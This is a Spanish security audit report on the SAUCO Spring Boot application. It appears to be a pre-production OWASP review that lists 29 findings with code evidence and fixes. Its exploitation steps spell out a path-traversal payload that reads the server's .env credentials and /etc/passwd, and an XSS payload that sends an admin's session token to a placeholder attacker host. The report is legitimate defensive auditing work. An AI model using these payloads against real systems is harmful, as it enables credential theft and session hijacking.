# Auditoría Final de Seguridad OWASP — SAUCO (Pre-Producción)

- **Fecha:** 2026-09-07
- **Alcance:** repositorio `actas-glpi-Suaco` en el commit `7bb5226` (rama `main`), estado limpio.
- **Metodología:** auditoría de código (SAST manual) por un panel de 6 revisores sobre las 14 categorías OWASP. Todo hallazgo fue verificado contra el código real con `archivo:línea`. Prohibido cualquier hallazgo teórico sin evidencia.
- **Stack auditado:** Backend Java 21 / Spring Boot 3.4.1 / Spring Security stateless JWT / PostgreSQL; Frontend HTML/CSS/JS vanilla; integración GLPI REST; generación DOCX→PDF (LibreOffice / OpenPDF); SMTP; almacenamiento en disco.

---

## 1. Resumen Ejecutivo

La aplicación tiene una base de control de seguridad **significativamente superior a la media** de proyectos de este tamaño: sin secretos hardcodeados (SEC-002 cumplido), sin SQL injection, sin SSRF, parametrización total de consultas, OTP con hash y bloqueo, tokens de firma de un solo uso con expiración, revocación de JWT por `jti` persistente, errores redactados sin stacktraces, contraseñas BCrypt con política, y headers endurecidos (CSP, HSTS, `no-referrer`).

Sin embargo, se encontró **1 hallazgo CRÍTICO** que permite **lectura arbitraria de archivos del servidor con exfiltración de credenciales de producción** (`backend/.env` con `DB_PASSWORD`, `JWT_SECRET`, `GLPI_*`) y posterior forja de JWTs de ADMINISTRADOR, explotable de extremo a extremo por un atacante sin credenciales. Se encontraron además **1 hallazgo ALTO** (stored XSS en el panel de administración), **13 MEDIO** y **14 BAJO**.

**Veredicto: ❌ NO APTO PARA PRODUCCIÓN.**

El CRÍTICO (SEC-101) bloquea el pase a producción. Es una sola causa raíz con un fix acotado (normalización + contención de ruta, y dejar de aceptar `rutaPdf` del cliente). Los tres de mayor prioridad (SEC-101, SEC-102, SEC-104) se pueden resolver en menos de un día de trabajo y revierten el veredicto a un análisis de riesgo operativo, no de seguridad crítica.

---

## 2. Riesgo General del Sistema

| Dimensión | Evaluación |
|---|---|
| Confidencialidad | **ALTA** afectada: lectura arbitraria de archivos (SEC-101) expone credenciales, datos personales de firmantes (fotos, firmas, cédulas) y documentos de terceros. |
| Integridad | Afectada de forma indirecta por SEC-101 (forja de JWT a partir de `JWT_SECRET`; adulteración de actas vía XSS SEC-102 con rol ADMIN). |
| Disponibilidad | Media: DoS acotado por `semáforo Semaphore(1)` de LibreOffice y colas sin límite (SEC-113); email bombing en recuperación (SEC-104). |
| Postura general | Controles de autenticación, sesión y OTP bien construidos; el defecto crítico está en la capa de **acceso a archivos** (referencia indirecta de objeto no contenida). |

**Riesgo residual global: ALTO.** El atacante anónimo → registrarse (TECNICO) → crear acta maliciosa → leer cualquier archivo del host. Esto convierte una vulnerabilidad de "acceso" en un compromiso total de credenciales.

---

## 3. Hallazgos por Severidad

| ID | Severidad | OWASP | Resumen | Archivo clave |
|---|---|---|---|---|
| SEC-101 | **CRÍTICO** | A01 / CWE-22 | Path traversal: lectura arbitraria de archivos vía `rutaPdf` controlada por el cliente | `ActaService.java:279-288` |
| SEC-102 | **ALTO** | A03 (XSS almacenado) | panel de usuarios inyecta `cargo` sin escapar; registro público lo permite | `usuarios.js:140-152` |
| SEC-103 | MEDIO | A07 | JWT sobreviven al cambio/reset de contraseña | `JwtService.java:72-82` |
| SEC-104 | MEDIO | A07/A05 | `/auth/recuperar` sin rate limit: email bombing + descarte de token legítimo | `RateLimitFilter.java:70-80` |
| SEC-105 | MEDIO | A09/A02 | Tokens de firma/reset en claro (BD, logs, auditoría) | `MailService.java:105`, `OtpService.java:88-95` |
| SEC-106 | MEDIO | A01 | `/descargar-acta/{nombreZip}` sin alcance por propietario (IDOR) | `DocxActaController.java:42-66` |
| SEC-107 | MEDIO | A01 | `/equipo/**` público: oráculo de inventario corporativo | `SecurityConfig.java:55` |
| SEC-108 | MEDIO | A02 | `mail.smtp.ssl.trust` debilita validación TLS del relay | `application.yml:111` |
| SEC-109 | MEDIO | A05 | `ddl-auto: update` en producción | `application.yml:35-36` |
| SEC-110 | MEDIO | A05 | Swagger/OpenAPI públicos por defecto (`true`) | `SecurityConfig.java:42` |
| SEC-111 | MEDIO | A03/A01 | Abuso del canal de correo corporativo (spam/phishing con marca) | `FirmaService.java:148-150` |
| SEC-112 | MEDIO | A02 | GLPI por HTTP plano: tokens en claro en tránsito | `application.yml:76` |
| SEC-113 | MEDIO | A04 | Sin límites en creación/generación: llenado de disco + cola ilimitada | `GeneracionDocumentalAsyncService.java:38-43` |
| SEC-114 | MEDIO | A05 | CORS solo loopback impide despliegue real | `SecurityConfig.java:132-148` |
| SEC-115 | MEDIO | A05 | Sin Dockerfile/compose ni actuator: `/health` 404, sin readiness | — (ausencia verificada) |

(14 hallazgos BAJO en sección 5.5.)

---

## 4. Evidencias Técnicas — Hallazgos de Seguridad

### SEC-101 — CRÍTICO | Broken Access Control / Path Traversal (lectura arbitraria de archivos)

- **Categoría:** A01:2021 Broken Access Control / CWE-22 Improper Limitation of a Pathname.
- **Módulo:** `acta` (creación + consulta de PDF), `firma` (portal público), `service` (regeneración de documento firmado).
- **Descripción:** El campo `rutaPdf` de `POST /actas` es texto libre controlado por el cliente. Se persiste tal cual en `acta.ruta_pdf`. El endpoint `GET /actas/{id}/pdf` (y `GET /firma/{token}/pdf`, público) resuelve esa ruta contra disco con un solo control de prefijo `startsWith("uploads/")`, **sin `.normalize()` ni verificación de que la ruta resultante quede dentro del directorio de uploads**. Con `uploads/../../<archivo>` se lee cualquier archivo regular del host. Como `POST /auth/register` otorga rol TECNICO en servidor, un atacante anónimo completa la cadena sin credenciales.
- **Evidencia (verificada por relectura):**
  - `CrearActaRequest.java:49-51` — `@Size(max=500, ...) String rutaPdf` (sin restricción de charset, sin validar `..`).
  - `ActaService.java:84` — `.rutaPdf(request.rutaPdf())` (persistencia verbatim).
  - `ActaService.java:279-288`:
    ```java
    private Resource resolverArchivo(String rutaVirtual) {
        if (rutaVirtual == null || !rutaVirtual.startsWith("uploads/")) return null;
        Path archivo = Paths.get(uploadsDir).resolve(rutaVirtual.substring("uploads/".length()));
        if (!Files.exists(archivo) || !Files.isRegularFile(archivo)) return null;
        return new FileSystemResource(archivo.toFile());
    }
    ```
  - `FirmaService.java:206-232` (`obtenerPdfPorToken`, portal sin JWT) y `:239+` (checklist): misma construcción sin normalizar en `:220-224`.
  - `SignedDocumentService.java:330-334` (`resolverPdf`): mismo patrón; opera sobre `acta.rutaPdf` (dato del cliente).
  - Contraste que demuestra que el patrón correcto existe en el repo: el ZIP sí se contiene — `ActaService.java:251-260` (`baseDir.resolve(soloNombre).normalize(); ... zip.startsWith(baseDir)`).
  - Facilitador: `AuthService.java:237-243` — registro público fuerza rol `TECNICO`.
- **Explotación concreta:**
  1. `POST /auth/register` `{cedula:"123456789", nombres:"A", apellidos:"B", username:"x1", correo:"x@x.com", password:"Clave123!", rol:"TECNICO"}` → JWT.
  2. `POST /actas` con `rutaPdf: "uploads/../../.env"` (en dev: `user.dir=backend`, `storage.root=${user.dir}/storage` → resuelve a `backend/.env`).
  3. `GET /actas/{id}/pdf` → bytes de `backend/.env` (contiene `DB_PASSWORD`, `JWT_SECRET`, `GLPI_APP_TOKEN`, `GLPI_USER_TOKEN`).
  4. Con `JWT_SECRET` se forjan JWTs con rol `ADMINISTRADOR` → control total. También `uploads/../../../../../../etc/passwd`, y PDFs/firmas/fotos de actas de terceros.
- **Impacto:** Compromiso total de credenciales, escalada a administrador, exfiltración de datos personales (foto del firmante con cédula).
- **Riesgo:** CRÍTICO. Explotable anónimamente; 5 requests bastan.
- **Plan de mitigación:**
  1. **Dejar de aceptar `rutaPdf`/`datosOriginales` en el request** (campos server-side). La ruta debe generarla el servidor (`uploads/pdf/...`) y el cliente no debe poder influirla.
  2. Si se conserva (legacy/DTO compartido), validar con whitelist estricta: `^uploads/pdf/[A-Za-z0-9._-]+\\.pdf$`.
  3. En **todos** los resolvedores (`ActaService.resolverArchivo`, `FirmaService.obtenerPdfPorToken/obtenerChecklistPdfPorToken`, `SignedDocumentService.resolverPdf`, `UsuarioService.obtenerFirmaArchivo`, `PdfService.resolverRutaArchivo`) aplicar: `Path base = Paths.get(uploadsDir).toAbsolutePath().normalize(); Path p = base.resolve(relativa).normalize(); if (!p.startsWith(base)) return null;`.
  4. Eliminar `rutaPdf` de la API de creación; derivar la ruta del flujo de generación.

---

### SEC-102 — ALTO | Stored XSS en panel de administración de usuarios

- **Categoría:** A03:2021 Injection (XSS almacenado).
- **Módulo:** Frontend `usuarios.js` + registro público.
- **Descripción:** La tabla de usuarios (`usuarios.html`, solo ADMIN) construye `tr.innerHTML` interpolando campos del usuario **sin escapar**. `cargo`, `empresa` y `lugarTrabajo` son texto libre en `POST /auth/register` (público) y en `POST /usuarios`. Un atacante registra una cuenta TECNICO con `cargo` malicioso; cuando un ADMIN abre la página, el payload se ejecuta en el navegador del ADMIN (robo del JWT de `sessionStorage`, acciones administrativas). El CSP `script-src 'self' 'unsafe-inline'` NO mitiga atributos `onerror`; y las páginas se sirven desde Live Server `:5500`/`file://` sin headers.
- **Evidencia (verificada):**
  - `frontend/js/usuarios.js:140-152` — `tr.innerHTML = `... `<td>${u.cargo || "-"}</td>` ...` (mismo sink del detalle en `:283-297`).
  - `RegisterUserRequest.java:61-71` — `cargo`/`empresa`/`lugarTrabajo` con solo `@Size`, sin `@Pattern` (contraste: `nombres`/`apellidos`/`username` sí tienen charset seguro en `:20-42`).
  - `SecurityConfig.java:88-91` — CSP con `'unsafe-inline'` en `script-src`.
- **Explotación:** `POST /auth/register` con `cargo: "<img src=x onerror=fetch('//atacante/?c='+sessionStorage.getItem('token'))>"`.
- **Impacto:** Ejecución de código en el contexto del ADMIN; robo de sesión, manipulación de actas/usuarios.
- **Riesgo:** ALTO.
- **Plan de mitigación:** En `usuarios.js` usar `createElement`/`textContent` (el patrón seguro ya existe en `actas.js:193` y `firmas.js:158`). Añadir `@Pattern` a `cargo`/`empresa`/`lugarTrabajo`. Endurecer CSP quitando `'unsafe-inline'` de `script-src` (revisar bootstrap de Swagger). Considerar desactivar el registro público en producción.

---

### SEC-103 — MEDIO | Sesiones JWT no invalidadas tras cambio/restablecimiento de contraseña

- **Módulo:** `security` / `auth`.
- **Evidencia:** `JwtService.java:72-82` valida solo username+exp+jti; `AuthService.java:106-108` cambia el hash sin tocar sesiones; `UserSecurity.java:45-47` `isCredentialsNonExpired() → true` siempre; no hay versión de credencial en `Usuario`.
- **Impacto:** un JWT robado sigue válido hasta 8 h (tope `MAX_EXPIRACION_MS`) tras cambio/reset de contraseña. Bloquear la cuenta sí lo invalida (`CustomUserDetailsService.java:30-32`).
- **Plan:** registrar `fecha_cambio_password`/versión en `Usuario` e incluirla en el JWT o compararla por request; revocar `jti` del usuario al cambiar/resetear.

### SEC-104 — MEDIO | `/auth/recuperar` sin rate limit (email bombing + descarte de token + DoS de disponibilidad SMTP)

- **Módulo:** `auth` / `RateLimitFilter`.
- **Evidencia:** `RateLimitFilter.java:29-30` y `:70-80` solo cubren `/auth/login` y `/auth/register`; `SecurityConfig.java:54` deja `/auth/recuperar/**` en `permitAll`; `AuthService.java:146` borra el token previo por cada petición y `:156-157` dispara envío SMTP síncrono (timeout 15 s, `application.yml:105`).
- **Impacto:** con el correo de la víctima, el atacante inutiliza la recuperación (el enlace legítimo "ya fue utilizado"), inunda la bandeja y satura el relay.
- **Plan:** rate limit por IP/correo sobre `/auth/recuperar` y `/auth/recuperar/confirmar`; no regenerar token si existe uno válido sin vencer.

### SEC-105 — MEDIO | Tokens de firma y de restablecimiento en claro (BD, logs, auditoría)

- **Módulo:** `mail`, `firma`, `auditoria`, `auth`.
- **Evidencia:** `MailService.java:105` loguea la URL completa con el token de firma; `OtpService.java:88-95` persiste `firmaToken.getToken()` y la URL en `auditoria_sistema` (`entidadId`, `recurso`) y `AuditoriaController.listar` (`:43-63`) los expone a AUDITOR; `PasswordResetToken.java:20-22` reconoce el almacenamiento del UUID en claro. Contraste: el OTP sí se guarda con hash BCrypt (`FirmaOtp.java:39-40`, `OtpService.java:79`).
- **Impacto:** filtración de logs/auditoría/backups ⇒ se pierden los enlaces de firma/reset (capabilities de un solo uso). Incoherente con SEC-010 (al AUDITOR se le niega `tokenFirma` en actas pero lo ve por auditoría).
- **Plan:** hashear tokens en BD (BCrypt) y guardar solo referencias/ids en logs y auditoría; loguear destinatario + id de token, nunca la URL.

### SEC-106 — MEDIO | `/descargar-acta/{nombreZip}` sin verificación de propietario (IDOR)

- **Módulo:** `controller/DocxActaController`.
- **Evidencia:** `DocxActaController.java:42-66` sirve el ZIP por nombre con `@PreAuthorize` de rol pero sin consulta de relación ZIP→acta ni `AccesoService` (contraste: `ActaService.obtenerZipConAcceso:246-261` sí lo hace). Nombres semipredecibles (`ActaLista_{serial}_{asunto}_{8hex}.zip`).
- **Impacto:** cualquier TECNICO/AUDITOR autenticado descarga DOCX con datos personales de actas ajenas si conoce el nombre.
- **Plan:** derivar el ZIP por id de acta con `cargarActaConAcceso`, o validar pertenencia antes de servir.

### SEC-107 — MEDIO | `/equipo/**` público (oráculo de inventario)

- **Módulo:** `config/SecurityConfig` + `controller/EquipoController`.
- **Evidencia:** `SecurityConfig.java:55` `"/equipo/**"` en `permitAll`; `EquipoController.java:33-44` sin `@PreAuthorize` (contraste: `UsuarioGlpiController` sí lo exige).
- **Impacto:** cualquiera consulta marca/tipo/modelo de cualquier activo por serial y confirma existencia de equipos; el frontend solo lo usa tras login.
- **Plan:** quitar de `permitAll` (exigir JWT TECNICO/ADMIN) o mover detrás de `@PreAuthorize`.

### SEC-108 — MEDIO | `mail.smtp.ssl.trust` debilita validación de certificado SMTP

- **Módulo:** `application.yml` / `MailConfig`.
- **Evidencia:** `application.yml:107-111` — `trust: ${MAIL_SMTP_TRUST:smtp-relay.brevo.com}` con comentario "Acepta el cert del host sin exigir la cadena completa".
- **Impacto:** MITM sobre los correos de firma/OTP/recuperación si se intercepta el relay.
- **Plan:** eliminar el `trust`, o restringirlo al host real validado mediante pinning explícito; exigir TLS con cadena verificada.

### SEC-109 — MEDIO | `ddl-auto: update` en todos los entornos

- **Módulo:** `resources/application.yml`.
- **Evidencia:** `application.yml:35-36`.
- **Impacto:** Hibernate puede ALTER/CREATE en runtime sobre la BD productiva; un mapping erróneo corrompe esquema con datos.
- **Plan:** `validate` (o migraciones explícitas — ya existe patrón en `resources/sql/`) en producción.

### SEC-110 — MEDIO | Swagger/OpenAPI públicos por defecto

- **Módulo:** `config/SecurityConfig` / `OpenApiConfig`.
- **Evidencia:** `SecurityConfig.java:42` `@Value("${app.documentacion.publica:true}")`; `application.yml` no define la propiedad → arranca `true`; `OpenApiConfig.java:26` expone correo corporativo del desarrollador.
- **Impacto:** esquemas con ejemplos de cédulas, correos, rutas y endpoints accesibles públicamente en un despliegue sin configuración explícita.
- **Plan:** invertir el default (`false`) y activar solo en dev, o exigir la variable explícita en producción.

### SEC-111 — MEDIO | Abuso del canal de correo corporativo (spam/phishing)

- **Módulo:** `firma` / `mail` / `auth`.
- **Evidencia:** `EnviarActaRequest.java:13` valida solo sintaxis `@Email` (sin dominio); `FirmaService.java:148-150` acepta el correo del request; `MailService.java:90-104` envía con marca/logo corporativo; `AuthService.java:241-257` da cuentas sin aprobación.
- **Impacto:** un TECNICO crea actas y envía correos de firma legítimos (logo, OTP, enlace) a cualquier dominio externo; el OTP y el enlace también llegan al atacante.
- **Plan:** allow-list de dominios corporativos para el correo de envío; limitar creación/envío por cuenta; revisar la conveniencia del autorregistro (o exigir verificación corporativa).

### SEC-112 — MEDIO | Integración GLPI por HTTP plano (tokens en tránsito)

- **Módulo:** `application.yml` / `service/EquipoService`.
- **Evidencia:** `application.yml:76` default `http://10.86.1.33/glpi/apirest.php`; `EquipoService.java:100-101` y `:165-166` envían `App-Token`/`Session-Token`/`Authorization` sin TLS.
- **Nota:** no es SSRF (host fijo por env, no controlable por request; serial con allow-list en `EquipoController.java:40-43`).
- **Impacto:** credenciales GLPI capturables por un agente en la LAN.
- **Plan:** `GLPI_URL` con `https://` en producción.

### SEC-113 — MEDIO | DoS por recurso ilimitado (llenado de disco, cola infinita, temp leak)

- **Módulo:** `GeneracionDocumentalAsyncService`, DTOs, `DocumentoWordService`.
- **Evidencia:** `GeneracionDocumentalAsyncService.java:38-43` — `newSingleThreadExecutor` con cola `LinkedBlockingQueue` ilimitada; `ActaRequest.java:66` `observaciones` sin `@Size`; `CrearActaRequest.java:53-54` `datosOriginales` sin límite; `DocumentoWordService.java:397-399` `createTempDirectory` por template sin borrado; semáforo global `Semaphore(1)` y timeout 120 s en `LibreOfficePdfService`.
- **Impacto:** un TECNICO genera actas ilimitadas; disco lleno + backlog de conversión + fuga de temporales.
- **Plan:** límites por cuenta (cuotas), `@Size` en campos, retención/limpieza de `generated/` y temp, cap en la cola.

### SEC-114 — MEDIO | CORS solo-loopback

- **Módulo:** `config/SecurityConfig`.
- **Evidencia:** `SecurityConfig.java:132-148` — orígenes fijos `127.0.0.1`/`localhost` (80, 5500, 8080, 8001) con `setAllowedHeaders("*")` y `setAllowCredentials(true)`.
- **Impacto:** despliegue real tras dominio requiere parametrizar orígenes; hoy el frontend de producción no podría llamar al backend.
- **Plan:** orígenes por variable de entorno (lista blanca del dominio real); listar headers en lugar de `*`.

### SEC-115 — MEDIO | Ausencia de Docker/actuator y `/health` sin implementación

- **Categoría:** A05 (configuración/readiness) — evaluación Docker en sección 9.
- **Evidencia:** no existe `Dockerfile`, `docker-compose.yml`, `.dockerignore` ni manifiestos k8s en todo el repo (verificado por búsqueda). `pom.xml` no declara `spring-boot-starter-actuator`. `/health` está en `permitAll` (`SecurityConfig.java:61`) pero no hay controller: devuelve 404.
- **Impacto:** sin healthcheck/readiness para orquestador/LB; el endpoint permitido es ruido.
- **Plan:** añadir actuator con `/health` acotado (sin `health-details` abiertos) o un controller dedicado; definir envs y storage para el despliegue (sección 9).

---

## 5. Hallazgos de Severidad BAJA

### 5.1 Recuperación / enumeración de usuarios
- **SEC-116 — BAJA** | Enumeración de cuentas por timing en `/auth/recuperar` + mensajes explícitos en `/auth/register` (`AuthService.java:227-235` "El nombre de usuario ya existe", "El correo ya está registrado"). El camino "existe" ejecuta SMTP síncrono (2-15 s) vs retorno inmediato del inexistente (`:128-133` vs `:147-160`). OWASP A07. Mitigación: respuesta unísona y mensajes genéricos de duplicado.

- **SEC-117 — BAJA** | Token de recuperación viaja en query string (`AuthService.java:155` → `recuperar.js:4`). Queda en historial/logs de proxy/beacons. `Referrer-Policy: no-referrer` solo aplica a respuestas del backend, no al host estático. A07. Mitigación: entregar por HTTPS y consumir en body (POST).

- **SEC-118 — BAJA** | Logout dual y best-effort: `/auth/logout` solo audita (`AuthService.java:217-224`) y la revocación real vive en `/sesiones/revocar` (`SesionController.java:39-67`), con `catch` vacío y 200 siempre; el frontend traga errores (`login.js:44-57`). Si la 2.ª llamada falla, el token vive. A07. Mitigación: unificar en un endpoint que revoque por `jti` y falle si la denylist no se escribe.

- **SEC-119 — BAJA** | `/firma/**` sin throttle por IP y `GET /firma/{token}/otp/estado` con efecto lateral (genera y envía OTP si no existe fila, `OtpService.java:163-169`). El brute force del OTP de 6 dígitos queda acotado a 5 intentos por fila (riesgo ~1e-5). A07. Mitigación: rate limit por IP/token; GET sin efecto lateral.

- **SEC-120 — BAJA** | Tokens de reset/firma en claro en BD (`PasswordResetToken.java:20-22`, `FirmaToken.java:31-32`) vs OTP hasheado. A02. Mitigación: hash BCrypt de capacidades (comparte remediación con SEC-105).

- **SEC-121 — BAJA** | Auditoría confía siempre en `X-Forwarded-For` (`AuditoriaService.java:64-72`), sin respetar `RATE_LIMIT_TRUST_XFF` (que sí respeta `RateLimitFilter`). Log poisoning/forense inválida. A09. Mitigación: misma bandera de confianza que el rate limiter.

- **SEC-122 — BAJA** | Mensajes de negocio con datos identificables al cliente vía `GlobalExceptionHandler` (ej. "El nombre de usuario ya existe: …", "Acta no encontrada con id: N" → enumeración de ids de actas, autenticado). A09.

### 5.2 Acceso y exposición
- **SEC-123 — BAJA** | `sort` sin allow-list en `UsuarioController.listarUsuarios:58` → `PropertyReferenceException` → 500 genérico. No es inyección SQL, pero es 500 inducible (contraste positivo: `ActaController.sortPermitido()` SEC-013). Endurecer.

- **SEC-124 — BAJA** | `PdfService.resolverRutaArchivo:91-99` tiene fallback `Paths.get(rutaArchivo)` (ruta absoluta directa) para rutas que no empiecen por `uploads/`. Hoy no explotable (rutas internas fijas); deuda de patrón. Aplicar normalize+contención igual que SEC-101.

- **SEC-125 — BAJA** | `/usuario?q=` devuelve `login`+`nombre`+`correo` de la caché GLPI a TECNICO sin paginación (`UsuarioGlpiController.java:42-47`, `q=""` vuelca todo). PII voz accesible por rol no administrativo (uso legítimo para autocompletar). Limitar tamaño y registrar lectura.

- **SEC-126 — BAJA** | `spring-boot-devtools` empaquetado (`pom.xml:130-135`, scope runtime). Excluir del artefacto de producción.

- **SEC-127 — BAJA** | `datosOriginales` en la allow-list de campos ordenables (`ActaController.java:61`) — superficie innecesaria sobre JSON crudo.

### 5.3 Infraestructura
- **SEC-128 — BAJA** | URL interna de GLPI commiteada como default (`application.yml:76` `http://10.86.1.33/…`): fuga de host interno si el repo se filtra. Parametrizar sin default interno.
- *(SEC-129 — INFO)* | `application.yml:111` default `smtp-relay.brevo.com` revela proveedor de correo (mismo bloque SEC-128/SEC-108).

---

## 6. Hallazgos Corregidos Previamente y Validados (controles confirmados en código)

Validado durante esta auditoría; **no** reportados como hallazgos porque el control existe y es funcional:

| Control | Evidencia |
|---|---|
| Sin secretos commiteados | `application.yml` con `DB_PASSWORD`/`JWT_SECRET` sin default (fail-fast, `:32,51`); `.env` gitignored; `.env.example` con placeholders vacíos; `git ls-files`/`git grep` limpios; `DataInitializer` solo siembra roles; `sql/*.sql` sin credenciales. **(SEC-002)** |
| Registro sin escalada de rol | `AuthService.java:237-243` fuerza rol `TECNICO` en servidor e ignora `request.rol()`. |
| Admin protegido | `UsuarioService.java:152-156,184-187` — admin principal no bloqueable ni degradable. |
| IDOR de actas | `AccesoService.verificarAccesoActa` aplicado en ver/PDF/checklist/ZIP/firma/foto/evidencias/historial/enviar/aprobar/rechazar; TECNICO solo ve actas propias (`ActaService.listarActas:120-137`); AUDITOR no recibe `tokenFirma` (**SEC-010**). |
| Revocación de JWT real y persistente | denylist `jwt_revocado` por `jti` (PK), chequeada en cada request (`JwtService.java:80-81`), poda de vencidas; `jti` único. (**SEC-011**) |
| Token de firma | single-use real (`FirmaService` marca `utilizado`+`fechaUtilizacion`), expiración 72 h, ligado a acta sin IDOR (`TokenFirmaValidador.java:31-56`). |
| OTP | 6 dígitos `SecureRandom` + hash BCrypt (`OtpService.java:48,75,79`), 5 intentos, cooldown 60 s, 3 reenvíos, single-use atómico anticoncurrencia (`FirmaOtpRepository.java:27-32`), sesión `X-OTP-Sesion` exigida en todos los endpoints de acta. |
| Passwords | BCrypt + política SEC-016 (min 8, 4 clases) en todos los DTOs de password; `cambiarPassword` exige clave actual. |
| Rate limit | login 20/60 s, registro 5/hora; `trust-x-forwarded-for=false` por defecto (**SEC-004**). |
| Errores sin fuga | `GlobalExceptionHandler` con mensajes genéricos, correos redactados, GLPI→502 genérico, sin stacktraces (**SEC-006**). |
| Headers | CSP, HSTS, `Referrer-Policy: no-referrer`, `frame-ancestors 'self'` (**SEC-007/SEC-015**). |
| SQLi | Parametrización total (sección 7.1); serial GLPI con allow-list (**SEC-005**). |
| ZIP/DOCX contenidos | `normalize()`+`startsWith` en `obtenerZipConAcceso`/`DocxActaController`; `NombreArchivoSeguro`. |
| Subidas de firma/foto | Base64 con validación de magic bytes PNG/JPEG + tamaño; nombres server-side fijos. |
| Usuario sin hash en responses | `UsuarioResponse`/`UsuarioMapper` no serializan `passwordHash`. |
| Frontend XSS base | `actas.js`/`firmas.js`/`acta-view.js`/`ui.js`/`app.js` usan `textContent`/`createElement` (solo `usuarios.js` rompe el patrón, SEC-102). |

---

## 7. Categorías sin hallazgos relevantes

### 7.1 SQL Injection — **Sin hallazgos relevantes.**
Cobertura completa de los 11 repositorios, los 11 controllers y los services con lógica de consulta. No existe `EntityManager`/JDBC manual/`JdbcTemplate`/`Specification` en `backend/src/main/java` (grep: sin coincidencias). Únicas consultas: derivadas de Spring Data y JPQL parametrizado con `@Query` + `@Param`. Los filtros del visor de auditoría (`AuditoriaConsultaService:113-201`) se aplican en memoria sobre streams, no en SQL dinámico. Única mejora de defensa en profundidad: `sort` sin allow-list (SEC-123).

### 7.2 SSRF — **Sin hallazgos relevantes.**
No existe campo URL controlable por el usuario en ningún DTO. GLPI usa `glpi.url` fijo por entorno; `EquipoController` valida el serial con allow-list `^[A-Za-z0-9._\-]{1,64}$` antes de URL-encodear; `HttpClient` sin seguimiento de redirects; timeouts 5s/15s. SMTP: host/puerto/from de configuración, nunca del usuario; destinatario validado con `@Email`.

### 7.3 CSRF — **Sin hallazgo (mitigado por diseño).**
La aplicación es `SessionCreationPolicy.STATELESS`, `csrf.disable()` está justificado: el JWT vive en `sessionStorage` (`login.js:33-37`) y viaja por header `Authorization: Bearer` (`app.js:363`, `ui.js:386`), sin cookies de sesión. En una request forjada no hay credencial automática que el navegador reenvíe. CORS con orígenes enumerados y sin comodín mantiene la contención. Nota operativa: `sessionStorage` reduce además el impacto de XSS (el token muere con la pestaña).

---

## 8. Recomendaciones Finales para Producción

**Imprescindible antes de desplegar:**
1. Corregir SEC-101 (path traversal) — causa raíz única, fix acotado (sección 5.1).
2. Corregir SEC-102 (stored XSS) — usar `textContent`/`createElement` en `usuarios.js` y regex en `cargo/empresa/lugarTrabajo`.
3. Corregir SEC-104 (`/auth/recuperar` sin rate limit).
4. Proteger `/equipo/**` (SEC-107) y dar alcance por propietario a `/descargar-acta` (SEC-106).
5. `DDL_AUTO=validate` en producción (SEC-109); `app.documentacion.publica=false` (SEC-110); GLPI por `https` (SEC-112).

**Configuración de despliegue:**
- Todas las credenciales por variables de entorno reales (`DB_PASSWORD`, `JWT_SECRET` ≥ 256 bits Base64, `GLPI_*`, `MAIL_*`, `STORAGE_ROOT`, `ADMIN_PROTEGIDO_USERNAME`).
- `RATE_LIMIT_TRUST_XFF=true` **solo** detrás de reverse proxy de confianza (El rate limiter es en-memoria, single-node: con réplicas no comparte contadores).
- HTTPS terminado en el proxy para que HSTS surta efecto; puerto 8001 interno.
- `mail.smtp.ssl.trust` fuera (SEC-108); retención/limpieza de `generated/` (SEC-113).
- Rotar cualquier valor que haya existido en el historial de git previo a SEC-002 (indicado en CLAUDE.md).

---

## 9. Evaluación Docker Readiness

**Estado: ❌ No hay artefactos de contenedor ni orquestación definida.** No existen `Dockerfile`, `docker-compose.yml`, `.dockerignore` ni manifiestos k8s. La app "arranca" como proceso JVM sobre el host.

| Requisito | Estado | Implicación |
|---|---|---|
| Secrets por env | ✅ Soportado | `application.yml` lee todo por variables; solo queda definir el `Environment` del contenedor. |
| Persistencia de archivos | ⚠️ Asumible | `STORAGE_ROOT` default `${user.dir}/storage` es frágil en imagen; requiere volumen montado (`/data/actas`). `SacoDB` localhost:5432 debe apuntar al servicio de BD. |
| LibreOffice | ❌ Bloqueante | `soffice.exe` se espera en `%USERPROFILE%/LibreOfficePortable/...` (`application.yml:151-152`): no existe en Linux. Requiere instalar LibreOffice headless en la imagen o externalizar el conversor (`libreoffice.path`). |
| HTTPS/TLS | ⚠️ | App sirve HTTP 8001; necesita terminator (proxy/LB) para que HSTS y producción sean seguros. |
| Rate limit | ⚠️ | En-memoria (single-node); replicación pierde contadores y XFF debe activarse tras proxy confiable. |
| Health/readiness | ❌ | `/health` devuelve 404; sin actuator. Orquestador no puede hacer liveness/readiness. (SEC-115). |
| Trust boundary | ⚠️ | Si se despliega tras proxy, revisar `RATE_LIMIT_TRUST_XFF` y los orígenes CORS (SEC-114). |

**Conclusión Docker:** la persistencia de credenciales por env y el storage ya están diseñados para contenedor, pero **falta la pieza de empaquetado y el conversor de PDF**. Sin Dockerfile no hay imagen reproducible, scan de vulnerabilidades de imagen ni orquestación. Añadir plataforma contenedora es paso prerequisito si producción es contenedor.

---

## 10. Conclusión Final

### ❌ NO APTO PARA PRODUCCIÓN

**Justificación técnica:**

1. **SEC-101 (CRÍTICO, CWE-22)** permite a un atacante **anónimo** (autorregistro público → TECNICO) la **lectura arbitraria de archivos del servidor**, incluyendo las credenciales de producción (`backend/.env`: `DB_PASSWORD`, `JWT_SECRET`, `GLPI_APP_TOKEN`, `GLPI_USER_TOKEN`), documentos y evidencias personales de terceros. Con `JWT_SECRET` se forjan tokens de rol **ADMINISTRADOR**, cerrando el compromiso total. Es explotable por la API autenticada **y** por el portal público de firma (sin JWT). La causa raíz es única y verificada en tres módulos.
2. **SEC-102 (ALTO, A03)** permite ejecución de JavaScript en el navegador del ADMINISTRADOR vía stored XSS del registro público, con robo de sesión y manipulación de actas/usuarios. El CSP actual (`'unsafe-inline'`) no lo detiene.
3. El resto de hallazgos (13 MEDIO, 14 BAJO) elevan el riesgo operativo (disponibilidad, indefinición de despliegue Docker, oráculos de datos, debilidad TLS de SMTP), pero no son por sí solos blockers.

**Trayectoria a APTO:** resolver SEC-101, SEC-102 y SEC-104 (corrección de causa raíz + hardening de superficie), proteger `/equipo/**`, contener `/descargar-acta`, definir la plataforma de despliegue (Docker + LibreOffice headless + actuator + HTTPS) **y** reverificar. La base de seguridad existente (JWT con revocación por `jti`, OTP hasheado con lockout, tokens single-use, errores redactados, ausencia SQLi/SSRF, secretos por entorno) es sólida y **no requiere re-diseño arquitectónico**; el tiempo estimado de remediación de los blockers es del orden de 1–2 días hábiles.